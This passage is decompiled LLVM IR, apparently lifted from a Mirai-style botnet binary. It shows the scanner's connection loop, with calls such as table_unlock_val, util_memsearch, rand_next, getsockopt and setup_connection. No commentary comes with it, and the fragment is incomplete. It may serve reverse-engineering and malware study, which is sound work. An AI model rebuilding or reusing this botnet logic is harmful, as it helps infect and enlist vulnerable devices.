  %v2_8050059 = add i32 %v0_8050047, -16
  %v3_8050059 = inttoptr i32 %v2_8050059 to i32*
  store i32 %v3_8050055, i32* %v3_8050059, align 4
  %v0_805005a = load i32, i32* %stack_var_-16, align 4
  %v4_805005a = call i32 @util_memsearch(i32 %v0_805005a, i32 %v0_804eda2, i32 %v0_804eda1, i32 %v0_804eda0)
  %v0_805005f = load i32, i32* @esp, align 4
  %v8_8050062 = icmp eq i32 %v4_805005a, -1
  %v1_8050063 = icmp eq i1 %v8_8050062, false
  %v2_8050063 = zext i1 %v1_8050063 to i32
  %v2_8050066 = icmp eq i1 %v1_8050063, false
  store i32 %v2_8050063, i32* %eax.global-to-local, align 4
  store i32 %v2_8050063, i32* @ebp, align 4
  %v1_80502f0 = add i32 %v0_805005f, 16
  %v2_80502f0 = inttoptr i32 %v1_80502f0 to i32*
  store i32 31, i32* %v2_80502f0, align 4
  br i1 %v2_8050066, label %dec_label_pc_80502ed, label %dec_label_pc_8050075

dec_label_pc_8050075:                             ; preds = %dec_label_pc_805002c
  %v0_805007a = load i32, i32* %stack_var_-16, align 4
  %v1_805007a = trunc i32 %v0_805007a to i8
  %v2_805007a = call i32 @table_lock_val(i8 %v1_805007a)
  store i32 %v2_805007a, i32* %eax.global-to-local, align 4
  %v0_805007f = load i32, i32* @esp, align 4
  %v1_805007f = add i32 %v0_805007f, 16
  %v0_804fc7a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804fc7a

dec_label_pc_8050087:                             ; preds = %dec_label_pc_804f74b
  %v0_8050087 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050087 = load i32, i32* @esp, align 4
  %v2_8050087 = add i32 %v1_8050087, -4
  %v3_8050087 = inttoptr i32 %v2_8050087 to i32*
  store i32 %v0_8050087, i32* %v3_8050087, align 4
  %v1_8050088 = add i32 %v1_8050087, -8
  %v2_8050088 = inttoptr i32 %v1_8050088 to i32*
  store i32 192, i32* %v2_8050088, align 4
  %v1_805008d = add i32 %v1_8050087, 16
  %v2_805008d = inttoptr i32 %v1_805008d to i32*
  %v3_805008d = load i32, i32* %v2_805008d, align 4
  store i32 %v3_805008d, i32* %eax.global-to-local, align 4
  %v2_8050091 = add i32 %v1_8050087, -12
  %v3_8050091 = inttoptr i32 %v2_8050091 to i32*
  store i32 %v3_805008d, i32* %v3_8050091, align 4
  %v1_8050092 = add i32 %v1_8050087, 20
  %v2_8050092 = inttoptr i32 %v1_8050092 to i32*
  %v3_8050092 = load i32, i32* %v2_8050092, align 4
  store i32 %v3_8050092, i32* %eax.global-to-local, align 4
  %v2_8050096 = add i32 %v1_8050087, 24
  %v3_8050096 = inttoptr i32 %v2_8050096 to i32*
  store i32 %v3_8050092, i32* %v3_8050096, align 4
  %v0_805009a = load i32, i32* %eax.global-to-local, align 4
  %v1_805009a = load i32, i32* @esp, align 4
  %v2_805009a = add i32 %v1_805009a, -4
  %v3_805009a = inttoptr i32 %v2_805009a to i32*
  store i32 %v0_805009a, i32* %v3_805009a, align 4
  %v0_805009b = load i32, i32* %stack_var_-16, align 4
  %v3_805009b = inttoptr i32 %v0_805009b to i8*
  %v4_805009b = call i32 @memmove(i8* %v3_805009b, i32 %v0_804eda2, i32 %v0_804eda1)
  store i32 %v4_805009b, i32* %eax.global-to-local, align 4
  %v0_80500a0 = load i32, i32* @esi, align 4
  %v1_80500a0 = add i32 %v0_80500a0, 24
  %v2_80500a0 = inttoptr i32 %v1_80500a0 to i32*
  %v3_80500a0 = load i32, i32* %v2_80500a0, align 4
  %v1_80500a3 = add i32 %v3_80500a0, -64
  store i32 %v1_80500a3, i32* %eax.global-to-local, align 4
  store i32 %v1_80500a3, i32* %v2_80500a0, align 4
  br label %dec_label_pc_804f760

dec_label_pc_80500b1:                             ; preds = %dec_label_pc_804f702
  %v1_80500b1 = add i32 %v0_804f70c, 1868
  %v2_80500b1 = inttoptr i32 %v1_80500b1 to i32*
  store i32 0, i32* %v2_80500b1, align 4
  %v0_80500bc = load i32, i32* @esp, align 4
  %v1_80500bc = add i32 %v0_80500bc, 1864
  %v2_80500bc = inttoptr i32 %v1_80500bc to i32*
  store i32 4, i32* %v2_80500bc, align 4
  %v0_80500c7 = load i32, i32* @esp, align 4
  %v1_80500ca = add i32 %v0_80500c7, 1864
  store i32 %v1_80500ca, i32* %eax.global-to-local, align 4
  %v2_80500d1 = add i32 %v0_80500c7, -16
  %v3_80500d1 = inttoptr i32 %v2_80500d1 to i32*
  store i32 %v1_80500ca, i32* %v3_80500d1, align 4
  %v1_80500d2 = add i32 %v0_80500c7, 1868
  store i32 %v1_80500d2, i32* %edx.global-to-local, align 4
  %v2_80500d9 = add i32 %v0_80500c7, -20
  %v3_80500d9 = inttoptr i32 %v2_80500d9 to i32*
  store i32 %v1_80500d2, i32* %v3_80500d9, align 4
  %v1_80500da = add i32 %v0_80500c7, -24
  %v2_80500da = inttoptr i32 %v1_80500da to i32*
  store i32 4, i32* %v2_80500da, align 4
  %v1_80500dc = add i32 %v0_80500c7, -28
  %v2_80500dc = inttoptr i32 %v1_80500dc to i32*
  store i32 1, i32* %v2_80500dc, align 4
  %v0_80500de = load i32, i32* @esi, align 4
  %v1_80500de = add i32 %v0_80500de, 4
  %v2_80500de = inttoptr i32 %v1_80500de to i32*
  %v3_80500de = load i32, i32* %v2_80500de, align 4
  store i32 %v3_80500de, i32* %eax.global-to-local, align 4
  %v2_80500e1 = add i32 %v0_80500c7, -32
  %v3_80500e1 = inttoptr i32 %v2_80500e1 to i32*
  store i32 %v3_80500de, i32* %v3_80500e1, align 4
  %v0_80500e2 = call i32 @getsockopt()
  store i32 %v0_80500e2, i32* %eax.global-to-local, align 4
  %v0_80500e7 = load i32, i32* @esp, align 4
  %v2_80500ea = add i32 %v0_80500e7, 1900
  %v3_80500ea = inttoptr i32 %v2_80500ea to i32*
  %v4_80500ea = load i32, i32* %v3_80500ea, align 4
  %v5_80500ea = or i32 %v4_80500ea, %v0_80500e2
  %v6_80500ea = icmp eq i32 %v5_80500ea, 0
  store i32 %v5_80500ea, i32* %eax.global-to-local, align 4
  %v1_80500f1 = icmp eq i1 %v6_80500ea, false
  br i1 %v1_80500f1, label %dec_label_pc_805023f, label %dec_label_pc_80500f7

dec_label_pc_80500f7:                             ; preds = %dec_label_pc_80500b1
  %v0_80500f7 = load i32, i32* @esi, align 4
  %v1_80500f7 = add i32 %v0_80500f7, 12
  %v2_80500f7 = inttoptr i32 %v1_80500f7 to i32*
  store i32 2, i32* %v2_80500f7, align 4
  %v0_80500fe = load i32, i32* %stack_var_-16, align 4
  %v1_80500fe = call i32 @rand_next(i32 %v0_80500fe)
  %v2_80500fe = sext i32 %v1_80500fe to i64
  %v0_8050103 = load i16, i16* @global_var_8057d8c.50, align 4
  %v1_8050103 = zext i16 %v0_8050103 to i32
  %v0_8050110 = load i32, i32* @global_var_8057d44.48, align 4
  store i32 %v0_8050110, i32* @ebx, align 4
  store i32 %v1_8050103, i32* %ecx.global-to-local, align 4
  %v8_805011a = zext i16 %v0_8050103 to i64
  %v9_805011a = udiv i64 %v2_80500fe, %v8_805011a
  %v10_805011a = trunc i64 %v9_805011a to i32
  store i32 %v10_805011a, i32* %eax.global-to-local, align 4
  %v11_805011a = urem i64 %v2_80500fe, %v8_805011a
  %v12_805011a = trunc i64 %v11_805011a to i32
  store i32 %v12_805011a, i32* %edx.global-to-local, align 4
  %tmp175 = icmp slt i32 %v0_8050110, 1
  br i1 %tmp175, label %dec_label_pc_8050238, label %dec_label_pc_8050124

dec_label_pc_8050124:                             ; preds = %dec_label_pc_80500f7
  %v0_8050124 = load i32, i32* @global_var_8057d88.49, align 8
  store i32 %v0_8050124, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_805013c = trunc i64 %v11_805011a to i16
  br label %dec_label_pc_805013c

dec_label_pc_8050130:                             ; preds = %dec_label_pc_8050142, %dec_label_pc_805013c
  %v1_8050130 = add i32 %v0_8050130, 1
  store i32 %v1_8050130, i32* %ecx.global-to-local, align 4
  %v1_8050131 = add i32 %v0_8050131, 16
  store i32 %v1_8050131, i32* %eax.global-to-local, align 4
  %v12_8050134 = icmp eq i32 %v1_8050130, %v0_8050110
  br i1 %v12_8050134, label %dec_label_pc_8050238.loopexit, label %dec_label_pc_805013c

dec_label_pc_805013c:                             ; preds = %dec_label_pc_8050130, %dec_label_pc_8050124
  %v0_8050130 = phi i32 [ %v1_8050130, %dec_label_pc_8050130 ], [ 0, %dec_label_pc_8050124 ]
  %v0_8050131 = phi i32 [ %v1_8050131, %dec_label_pc_8050130 ], [ %v0_8050124, %dec_label_pc_8050124 ]
  %v3_805013c = add i32 %v0_8050131, 8
  %v4_805013c = inttoptr i32 %v3_805013c to i16*
  %v5_805013c = load i16, i16* %v4_805013c, align 2
  %v11_805013c = icmp ult i16 %v1_805013c, %v5_805013c
  br i1 %v11_805013c, label %dec_label_pc_8050130, label %dec_label_pc_8050142

dec_label_pc_8050142:                             ; preds = %dec_label_pc_805013c
  %v3_8050142 = add i32 %v0_8050131, 10
  %v4_8050142 = inttoptr i32 %v3_8050142 to i16*
  %v5_8050142 = load i16, i16* %v4_8050142, align 2
  %v11_8050142 = icmp ult i16 %v1_805013c, %v5_8050142
  %v1_8050146 = icmp eq i1 %v11_8050142, false
  br i1 %v1_8050146, label %dec_label_pc_8050130, label %dec_label_pc_8050148.loopexit

dec_label_pc_8050148.loopexit:                    ; preds = %dec_label_pc_8050142
  br label %dec_label_pc_8050148

dec_label_pc_8050148:                             ; preds = %dec_label_pc_8050148.loopexit, %dec_label_pc_8050238
  %v0_8050148 = phi i32 [ %v0_8050131, %dec_label_pc_8050148.loopexit ], [ 0, %dec_label_pc_8050238 ]
  %v1_8050148 = load i32, i32* @esi, align 4
  %v2_8050148 = inttoptr i32 %v1_8050148 to i32*
  store i32 %v0_8050148, i32* %v2_8050148, align 4
  %v0_805014a = load i32, i32* @esi, align 4
  %v1_805014a = add i32 %v0_805014a, 4
  %v2_805014a = inttoptr i32 %v1_805014a to i32*
  %v3_805014a = load i32, i32* %v2_805014a, align 4
  store i32 %v3_805014a, i32* %eax.global-to-local, align 4
  store i32 %v3_805014a, i32* %edx.global-to-local, align 4
  %v1_8050151 = urem i32 %v3_805014a, 32
  store i32 %v1_8050151, i32* %ecx.global-to-local, align 4
  %v1_8050154 = add i32 %v0_805014a, 24
  %v2_8050154 = inttoptr i32 %v1_8050154 to i32*
  store i32 0, i32* %v2_8050154, align 4
  %v0_805015b = load i32, i32* %edx.global-to-local, align 4
  %v2_805015b = udiv i32 %v0_805015b, 32
  store i32 %v2_805015b, i32* %edx.global-to-local, align 4
  %v0_804f71f.pre = load i32, i32* @esp, align 4
  %v7_804f71f.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_804f727.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f71f

dec_label_pc_8050163:                             ; preds = %dec_label_pc_804fd2b, %dec_label_pc_804fce5
  %v0_8050163 = load i32, i32* @esp, align 4
  %v1_8050166 = add i32 %v0_8050163, -16
  %v2_8050166 = inttoptr i32 %v1_8050166 to i32*
  store i32 32, i32* %v2_8050166, align 4
  %v0_8050168 = load i32, i32* %stack_var_-16, align 4
  %v1_8050168 = trunc i32 %v0_8050168 to i8
  %v2_8050168 = call i32 @table_unlock_val(i8 %v1_8050168)
  store i32 %v2_8050168, i32* %eax.global-to-local, align 4
  %v0_805016d = load i32, i32* @esp, align 4
  %v1_805016d = inttoptr i32 %v0_805016d to i32*
  store i32 33, i32* %v1_805016d, align 4
  %v0_8050174 = load i32, i32* %stack_var_-16, align 4
  %v1_8050174 = trunc i32 %v0_8050174 to i8
  %v2_8050174 = call i32 @table_unlock_val(i8 %v1_8050174)
  store i32 %v2_8050174, i32* %eax.global-to-local, align 4
  %v0_8050179 = load i32, i32* @esp, align 4
  %v1_8050179 = inttoptr i32 %v0_8050179 to i32*
  %v2_8050179 = load i32, i32* %v1_8050179, align 4
  store i32 %v2_8050179, i32* %ecx.global-to-local, align 4
  %v3_8050179 = add i32 %v0_8050179, 4
  %v1_805017a = inttoptr i32 %v3_8050179 to i32*
  %v2_805017a = load i32, i32* %v1_805017a, align 4
  store i32 %v2_805017a, i32* %ebx.global-to-local, align 4
  %v1_805017b = add i32 %v0_8050179, 1880
  store i32 %v1_805017b, i32* %ecx.global-to-local, align 4
  store i32 %v1_805017b, i32* %v1_805017a, align 4
  store i32 32, i32* %v1_8050179, align 4
  %v0_8050185 = load i32, i32* %stack_var_-16, align 4
  %v3_8050185 = call i32 @table_retrieve_val(i32 %v0_8050185, i32* %v2_8050185)
  store i32 %v3_8050185, i32* %eax.global-to-local, align 4
  store i32 %v3_8050185, i32* @ebx, align 4
  %v0_805018c = load i32, i32* @esp, align 4
  %v1_805018c = inttoptr i32 %v0_805018c to i32*
  %v2_805018c = load i32, i32* %v1_805018c, align 4
  store i32 %v2_805018c, i32* %eax.global-to-local, align 4
  %v3_805018c = add i32 %v0_805018c, 4
  %v1_805018d = inttoptr i32 %v3_805018c to i32*
  %v2_805018d = load i32, i32* %v1_805018d, align 4
  store i32 %v2_805018d, i32* %edx.global-to-local, align 4
  %v1_805018e = add i32 %v0_805018c, 1884
  store i32 %v1_805018e, i32* %eax.global-to-local, align 4
  store i32 %v1_805018e, i32* %v1_805018d, align 4
  store i32 33, i32* %v1_805018c, align 4
  %v0_8050198 = load i32, i32* %stack_var_-16, align 4
  %v3_8050198 = call i32 @table_retrieve_val(i32 %v0_8050198, i32* %v2_8050185)
  store i32 %v3_8050198, i32* %eax.global-to-local, align 4
  store i32 %v3_8050198, i32* @edi, align 4
  %v0_805019f = load i32, i32* @esp, align 4
  %v1_805019f = add i32 %v0_805019f, 1880
  %v2_805019f = inttoptr i32 %v1_805019f to i32*
  %v3_805019f = load i32, i32* %v2_805019f, align 4
  %v1_80501a6 = add i32 %v3_805019f, -1
  store i32 %v1_80501a6, i32* %eax.global-to-local, align 4
  %v2_80501a7 = add i32 %v0_805019f, -4
  %v3_80501a7 = inttoptr i32 %v2_80501a7 to i32*
  store i32 %v1_80501a6, i32* %v3_80501a7, align 4
  %v0_80501a8 = load i32, i32* @ebx, align 4
  %v2_80501a8 = add i32 %v0_805019f, -8
  %v3_80501a8 = inttoptr i32 %v2_80501a8 to i32*
  store i32 %v0_80501a8, i32* %v3_80501a8, align 4
  %v0_80501a9 = load i32, i32* @esi, align 4
  %v1_80501a9 = add i32 %v0_80501a9, 24
  %v2_80501a9 = inttoptr i32 %v1_80501a9 to i32*
  %v3_80501a9 = load i32, i32* %v2_80501a9, align 4
  store i32 %v3_80501a9, i32* %eax.global-to-local, align 4
  %v2_80501ac = add i32 %v0_805019f, -12
  %v3_80501ac = inttoptr i32 %v2_80501ac to i32*
  store i32 %v3_80501a9, i32* %v3_80501ac, align 4
  %v1_80501ad = add i32 %v0_805019f, 40
  %v2_80501ad = inttoptr i32 %v1_80501ad to i32*
  %v3_80501ad = load i32, i32* %v2_80501ad, align 4
  store i32 %v3_80501ad, i32* %eax.global-to-local, align 4
  %v2_80501b1 = add i32 %v0_805019f, -16
  %v3_80501b1 = inttoptr i32 %v2_80501b1 to i32*
  store i32 %v3_80501ad, i32* %v3_80501b1, align 4
  %v0_80501b2 = load i32, i32* %stack_var_-16, align 4
  %v4_80501b2 = call i32 @util_memsearch(i32 %v0_80501b2, i32 %v0_804eda2, i32 %v0_804eda1, i32 %v0_804eda0)
  %v0_80501b7 = load i32, i32* @esp, align 4
  %v1_80501b7 = add i32 %v0_80501b7, 32
  %v8_80501ba = icmp eq i32 %v4_80501b2, -1
  %v1_80501bb = icmp eq i1 %v8_80501ba, false
  %v2_80501bb = zext i1 %v1_80501bb to i32
  %v2_80501be = icmp eq i1 %v1_80501bb, false
  store i32 %v2_80501bb, i32* %eax.global-to-local, align 4
  store i32 %v2_80501bb, i32* @ebp, align 4
  br i1 %v2_80501be, label %dec_label_pc_80501f0, label %dec_label_pc_80501c9

dec_label_pc_80501c9:                             ; preds = %dec_label_pc_80501f0, %dec_label_pc_8050163
  %v0_80501c9 = phi i32 [ %v1_8050208, %dec_label_pc_80501f0 ], [ %v1_80501b7, %dec_label_pc_8050163 ]
  %v1_80501cc = add i32 %v0_80501c9, -16
  %v2_80501cc = inttoptr i32 %v1_80501cc to i32*
  store i32 32, i32* %v2_80501cc, align 4
  %v0_80501ce = load i32, i32* %stack_var_-16, align 4
  %v1_80501ce = trunc i32 %v0_80501ce to i8
  %v2_80501ce = call i32 @table_lock_val(i8 %v1_80501ce)
  store i32 %v2_80501ce, i32* %eax.global-to-local, align 4
  %v0_80501d3 = load i32, i32* @esp, align 4
  %v1_80501d3 = inttoptr i32 %v0_80501d3 to i32*
  store i32 33, i32* %v1_80501d3, align 4
  %v0_80501da = load i32, i32* %stack_var_-16, align 4
  %v1_80501da = trunc i32 %v0_80501da to i8
  %v2_80501da = call i32 @table_lock_val(i8 %v1_80501da)
  store i32 %v2_80501da, i32* %eax.global-to-local, align 4
  %v0_80501e2 = load i32, i32* @ebp, align 4
  %tmp176 = icmp slt i32 %v0_80501e2, 1
  br i1 %tmp176, label %dec_label_pc_804fcb3, label %dec_label_pc_80501c9.dec_label_pc_804fd3d_crit_edge

dec_label_pc_80501c9.dec_label_pc_804fd3d_crit_edge: ; preds = %dec_label_pc_80501c9
  %v0_80501df = load i32, i32* @esp, align 4
  %v1_80501df = add i32 %v0_80501df, 16
  %v0_804fd3d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804fd3d

dec_label_pc_80501f0:                             ; preds = %dec_label_pc_8050163
  %v1_80501f0 = add i32 %v0_80501b7, 1900
  %v2_80501f0 = inttoptr i32 %v1_80501f0 to i32*
  %v3_80501f0 = load i32, i32* %v2_80501f0, align 4
  %v1_80501f7 = add i32 %v3_80501f0, -1
  store i32 %v1_80501f7, i32* %eax.global-to-local, align 4
  %v2_80501f8 = add i32 %v0_80501b7, 28
  %v3_80501f8 = inttoptr i32 %v2_80501f8 to i32*
  store i32 %v1_80501f7, i32* %v3_80501f8, align 4
  %v0_80501f9 = load i32, i32* @edi, align 4
  %v2_80501f9 = add i32 %v0_80501b7, 24
  %v3_80501f9 = inttoptr i32 %v2_80501f9 to i32*
  store i32 %v0_80501f9, i32* %v3_80501f9, align 4
  %v0_80501fa = load i32, i32* @esi, align 4
  %v1_80501fa = add i32 %v0_80501fa, 24
  %v2_80501fa = inttoptr i32 %v1_80501fa to i32*
  %v3_80501fa = load i32, i32* %v2_80501fa, align 4
  store i32 %v3_80501fa, i32* %eax.global-to-local, align 4
  %v2_80501fd = add i32 %v0_80501b7, 20
  %v3_80501fd = inttoptr i32 %v2_80501fd to i32*
  store i32 %v3_80501fa, i32* %v3_80501fd, align 4
  %v1_80501fe = add i32 %v0_80501b7, 56
  %v2_80501fe = inttoptr i32 %v1_80501fe to i32*
  %v3_80501fe = load i32, i32* %v2_80501fe, align 4
  store i32 %v3_80501fe, i32* %eax.global-to-local, align 4
  %v2_8050202 = add i32 %v0_80501b7, 16
  %v3_8050202 = inttoptr i32 %v2_8050202 to i32*
  store i32 %v3_80501fe, i32* %v3_8050202, align 4
  %v0_8050203 = load i32, i32* %stack_var_-16, align 4
  %v4_8050203 = call i32 @util_memsearch(i32 %v0_8050203, i32 %v0_804eda2, i32 %v0_804eda1, i32 %v0_804eda0)
  %v0_8050208 = load i32, i32* @esp, align 4
  %v1_8050208 = add i32 %v0_8050208, 16
  %v8_805020b = icmp eq i32 %v4_8050203, -1
  %v1_805020c = icmp eq i1 %v8_805020b, false
  %v2_805020c = zext i1 %v1_805020c to i32
  %v2_805020f = icmp eq i1 %v1_805020c, false
  store i32 %v2_805020c, i32* %eax.global-to-local, align 4
  store i32 %v2_805020c, i32* @ebp, align 4
  %v1_8050218 = icmp eq i1 %v2_805020f, false
  br i1 %v1_8050218, label %dec_label_pc_80501c9, label %dec_label_pc_805021a

dec_label_pc_805021a:                             ; preds = %dec_label_pc_80501f0
  %v2_805021d = inttoptr i32 %v0_8050208 to i32*
  store i32 32, i32* %v2_805021d, align 4
  %v0_805021f = load i32, i32* %stack_var_-16, align 4
  %v1_805021f = trunc i32 %v0_805021f to i8
  %v2_805021f = call i32 @table_lock_val(i8 %v1_805021f)
  store i32 %v2_805021f, i32* %eax.global-to-local, align 4
  %v0_8050224 = load i32, i32* @esp, align 4
  %v1_8050224 = inttoptr i32 %v0_8050224 to i32*
  store i32 33, i32* %v1_8050224, align 4
  %v0_805022b = load i32, i32* %stack_var_-16, align 4
  %v1_805022b = trunc i32 %v0_805022b to i8
  %v2_805022b = call i32 @table_lock_val(i8 %v1_805022b)
  store i32 %v2_805022b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f740.backedge

dec_label_pc_8050238.loopexit:                    ; preds = %dec_label_pc_8050130
  br label %dec_label_pc_8050238

dec_label_pc_8050238:                             ; preds = %dec_label_pc_8050238.loopexit, %dec_label_pc_80500f7
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050148

dec_label_pc_805023f:                             ; preds = %dec_label_pc_80500b1
  %v0_8050242 = load i32, i32* @esi, align 4
  %v1_8050242 = add i32 %v0_8050242, 4
  %v2_8050242 = inttoptr i32 %v1_8050242 to i32*
  %v3_8050242 = load i32, i32* %v2_8050242, align 4
  store i32 %v3_8050242, i32* @eax, align 4
  %v2_8050245 = add i32 %v0_80500e7, 16
  %v3_8050245 = inttoptr i32 %v2_8050245 to i32*
  store i32 %v3_8050242, i32* %v3_8050245, align 4
  %v0_8050246 = load i32, i32* %stack_var_-16, align 4
  %v1_8050246 = call i32 @__GI___libc_close(i32 %v0_8050246)
  store i32 %v1_8050246, i32* %eax.global-to-local, align 4
  %v0_805024e = load i32, i32* @esi, align 4
  %v1_805024e = add i32 %v0_805024e, 4
  %v2_805024e = inttoptr i32 %v1_805024e to i32*
  store i32 -1, i32* %v2_805024e, align 4
  %v0_8050255 = load i32, i32* @esi, align 4
  %v1_8050255 = add i32 %v0_8050255, 284
  %v2_8050255 = inttoptr i32 %v1_8050255 to i8*
  store i8 0, i8* %v2_8050255, align 1
  %v0_805025c = load i32, i32* @esi, align 4
  %v1_805025c = add i32 %v0_805025c, 12
  %v2_805025c = inttoptr i32 %v1_805025c to i32*
  store i32 0, i32* %v2_805025c, align 4
  br label %dec_label_pc_804fcc6

dec_label_pc_80502ed:                             ; preds = %dec_label_pc_805002c
  %v2_80502f2 = call i32 @table_lock_val(i8 %v1_80502f2)
  store i32 %v2_80502f2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f740.backedge

dec_label_pc_804f740.backedge:                    ; preds = %dec_label_pc_804f7b7, %dec_label_pc_804fb6c, %dec_label_pc_804faac, %dec_label_pc_804f9ed, %dec_label_pc_804f930, %dec_label_pc_804f873, %dec_label_pc_804f8b9, %dec_label_pc_804f976, %dec_label_pc_804fa35, %dec_label_pc_804faf5, %dec_label_pc_804fbb5, %dec_label_pc_80502ed, %dec_label_pc_805021a
  %v0_804f740 = load i32, i32* @esi, align 4
  %v1_804f740 = add i32 %v0_804f740, 12
  %v2_804f740 = inttoptr i32 %v1_804f740 to i32*
  %v3_804f740 = load i32, i32* %v2_804f740, align 4
  store i32 %v3_804f740, i32* %eax.global-to-local, align 4
  %v1_804f743 = icmp eq i32 %v3_804f740, 0
  br i1 %v1_804f743, label %dec_label_pc_804fcc6, label %dec_label_pc_804f74b.preheader

dec_label_pc_80503a0:                             ; preds = %dec_label_pc_804f5e0
  %v3_80503ab = add nuw nsw i32 %v2_80503ab, 1572
  %v4_80503ab = add i32 %v3_80503ab, %v0_80503ab
  %v5_80503ab = inttoptr i32 %v4_80503ab to i32*
  %v6_80503ab = load i32, i32* %v5_80503ab, align 4
  %v9_80503ab = shl i32 1, %v1_80503a5
  %v12_80503ab = or i32 %v6_80503ab, %v9_80503ab
  store i32 %v12_80503ab, i32* %v5_80503ab, align 4
  %v0_80503b3 = load i32, i32* @ebx, align 4
  %v1_80503b3 = add i32 %v0_80503b3, 4
  %v2_80503b3 = inttoptr i32 %v1_80503b3 to i32*
  %v3_80503b3 = load i32, i32* %v2_80503b3, align 4
  store i32 %v3_80503b3, i32* %eax.global-to-local, align 4
  %v1_80503b6 = load i32, i32* @esi, align 4
  %v2_80503b6 = sub i32 %v3_80503b3, %v1_80503b6
  %v8_80503b6 = xor i32 %v1_80503b6, %v3_80503b3
  %v9_80503b6 = xor i32 %v2_80503b6, %v3_80503b3
  %v10_80503b6 = and i32 %v9_80503b6, %v8_80503b6
  %v11_80503b6 = icmp slt i32 %v10_80503b6, 0
  %v12_80503b6 = icmp eq i32 %v2_80503b6, 0
  %v13_80503b6 = icmp slt i32 %v2_80503b6, 0
  %v3_80503b8 = icmp ne i1 %v13_80503b6, %v11_80503b6
  %v4_80503b8 = or i1 %v12_80503b6, %v3_80503b8
  br i1 %v4_80503b8, label %dec_label_pc_804f603, label %dec_label_pc_80503be

dec_label_pc_80503be:                             ; preds = %dec_label_pc_80503a0
  store i32 %v3_80503b3, i32* @esi, align 4
  br label %dec_label_pc_804f603

dec_label_pc_80503c5:                             ; preds = %dec_label_pc_804ee5d
  %v0_80503c8 = load i32, i32* @global_var_805a874.52, align 4
  store i32 %v0_80503c8, i32* %ebx.global-to-local, align 4
  store i32 %v0_80503c8, i32* %stack_var_-1916, align 4
  %v1_80503cf = call i32 @__GI___libc_close(i32 %v0_80503c8)
  store i32 %v1_80503cf, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-1916, align 4
  %v1_80503db = call i32 @__GI_exit(i32 0)
  store i32 %v1_80503db, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80503e0

dec_label_pc_80503e0:                             ; preds = %dec_label_pc_804f666, %dec_label_pc_804f646, %dec_label_pc_80503c5
  %stack_var_-1892.7 = phi i32 [ %stack_var_-1892.6, %dec_label_pc_804f646 ], [ %stack_var_-1892.6, %dec_label_pc_804f666 ], [ %tmp136, %dec_label_pc_80503c5 ]
  %stack_var_-1888.7 = phi i32 [ %stack_var_-1888.6, %dec_label_pc_804f646 ], [ %stack_var_-1888.6, %dec_label_pc_804f666 ], [ %tmp137, %dec_label_pc_80503c5 ]
  %v0_80503e0 = load i32, i32* @ebx, align 4
  %v1_80503e0 = add i32 %v0_80503e0, 284
  %v2_80503e0 = inttoptr i32 %v1_80503e0 to i8*
  store i8 0, i8* %v2_80503e0, align 1
  %v0_80503e7 = load i32, i32* @ebx, align 4
  %v1_80503e7 = add i32 %v0_80503e7, 12
  %v2_80503e7 = inttoptr i32 %v1_80503e7 to i32*
  store i32 0, i32* %v2_80503e7, align 4
  br label %dec_label_pc_804f603

dec_label_pc_80503f3:                             ; preds = %dec_label_pc_804ffc3
  %v1_80503f3 = add i32 %v0_804f78a, 56
  %v2_80503f3 = inttoptr i32 %v1_80503f3 to i32*
  %v3_80503f3 = load i32, i32* %v2_80503f3, align 4
  store i32 %v3_80503f3, i32* %ecx.global-to-local, align 4
  %v1_80503f7 = inttoptr i32 %v3_80503f3 to i32*
  store i32 104, i32* %v1_80503f7, align 4
  %v0_804ffdf.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ffdf

dec_label_pc_8050402:                             ; preds = %dec_label_pc_804ffdf
  store i32 %v0_8050402, i32* @eax, align 4
  %v0_8050404 = call i32 @setup_connection()
  store i32 %v0_8050404, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fcc6

; uselistorder directives
  uselistorder i32 %v2_80503b6, { 1, 2, 0 }
  uselistorder i32 %v3_80503b3, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_805019f, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v0_8050131, { 0, 2, 3, 1 }
  uselistorder i32 %v1_8050130, { 1, 0, 2 }
  uselistorder i16 %v1_805013c, { 1, 0 }
  uselistorder i64 %v8_805011a, { 1, 0 }
  uselistorder i32 %v0_8050047, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v0_8050402, { 1, 0 }
  uselistorder i32 %v7_804fef1, { 1, 0 }
  uselistorder i32 %v0_804fef1, { 0, 2, 1 }
  uselistorder i32 %v6_804fee4, { 1, 0 }
  uselistorder i32 %v0_804fee4, { 1, 2, 0 }
  uselistorder i32 %v3_804fed6, { 1, 0 }
  uselistorder i32 %v0_804fed6, { 1, 0 }
  uselistorder i32 %v4_804fed1, { 1, 0 }
  uselistorder i32 %v2_804fe8c, { 0, 2, 1 }
  uselistorder i32 %v1_804fe89, { 1, 0, 2 }
  uselistorder i32 %v0_804fe89, { 1, 0 }
  uselistorder i32 %v0_804fe86, { 1, 0 }
  uselistorder i32 %v0_804fe82, { 0, 1, 4, 3, 2, 5 }
  uselistorder i32 %v2_804fd83, { 1, 0 }
  uselistorder i32 %v0_804fd83, { 1, 2, 4, 3, 0 }
  uselistorder i32 %v1_804fd83, { 0, 2, 1 }
  uselistorder i32 %v0_804fe0b125, { 1, 0 }
  uselistorder i32 %v2_804fdff, { 1, 0 }
  uselistorder i32 %v0_804fdff, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_804fdf9, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804fdf9, { 0, 2, 1 }
  uselistorder i32 %v4_804fdf4, { 1, 0 }
  uselistorder i32 %v0_804fdbd, { 1, 0, 2 }
  uselistorder i8* %v1_804fdab, { 1, 0, 2 }
  uselistorder i32 %v1_804fda4, { 1, 0, 2 }
  uselistorder i32 %v1_804fd90, { 1, 0, 2 }
  uselistorder i32 %v0_804fe22, { 1, 0, 2 }
  uselistorder i32 %v0_804fe1a, { 3, 0, 1, 2 }
  uselistorder i32 %v0_804fe0b126, { 3, 0, 1, 2 }
